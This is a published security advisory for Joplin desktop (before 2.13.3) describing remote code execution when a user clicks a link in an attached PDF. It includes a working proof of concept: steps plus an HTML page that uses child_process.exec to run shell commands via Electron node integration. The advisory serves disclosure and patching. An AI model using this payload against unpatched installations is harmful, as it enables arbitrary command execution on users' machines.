# Arbitrary code execution on click of PDF links

High

published
GHSA-g8qx-5vcm-3x59
Jun 21, 2024

## Package

joplin-desktop

## Affected versions

< 2.13.3

## Patched versions

2.13.3

## Description

### Summary

An RCE vulnerability allows clicking on a link in a PDF in an untrusted note to execute arbitrary shell commands.

### Details

Clicking links in PDFs allows for arbitrary code execution because Joplin desktop

1. has [not disabled top redirection for note viewer iframes](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox),
2. and has node integration enabled.

This code

[joplin/packages/app-desktop/main-html.js](https://github.com/laurent22/joplin/blob/2d06fd9d1325d533a7542baaf79d3ff31a668e42/packages/app-desktop/main-html.js#L33-L40)

Lines 33 to 40
in
[2d06fd9](/laurent22/joplin/commit/2d06fd9d1325d533a7542baaf79d3ff31a668e42)

|  |  |
| --- | --- |
|  | // Security: If we attempt to navigate away from the root HTML page, it's likely because |
|  | // of an improperly sanitized link. Prevent this by closing the window before we can |
|  | // navigate away. |
|  | window.onbeforeunload = () => { |
|  | window.close(); |
|  | }; |
|  |  |

added after fixing a similar vulnerability **does not prevent arbitrary code execution** when the "show tray icon" setting is enabled (as it is on Windows/MacOS by default).
### PoC

1. Create a new note with the following content:

```
[Click for PoC](http://127.0.0.1:8000) <-- A different URL (e.g. to the internet) could be used here
```

2. Print the note to PDF
3. Create a new directory with a single file, `index.html`:

```
<!DOCTYPE html>
<html lang="en">
<body>
<textarea id="textarea"></textarea><button onclick="eval(textarea.value)">GO</button>
<script>
const child_proc = top.require('child_process')

// Change dir to ls if on MacOS/Linux
child_proc.exec('dir', (err, stdout) => {textarea.value= stdout + ", " + err;})

// Also show a window to show that this runs as soon as the link is clicked
// (the user doesn't have to show Joplin by clicking on the tray icon)
const remote = require('@electron/remote');
const win = new remote.BrowserWindow();
win.loadURL('http://127.0.0.1:8000/404.html')
</script>
</body>
</html>
```

4. Start a local server (e.g. with `python3 -m http.server`) serving on port 8000 in that directory
5. Attach the printed PDF to a note
6. Click the "Click for PoC" link in the embedded PDF

### Impact

This is a remote code execution vulnerability that impacts anyone who attaches untrusted PDFs to notes and has the icon enabled.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
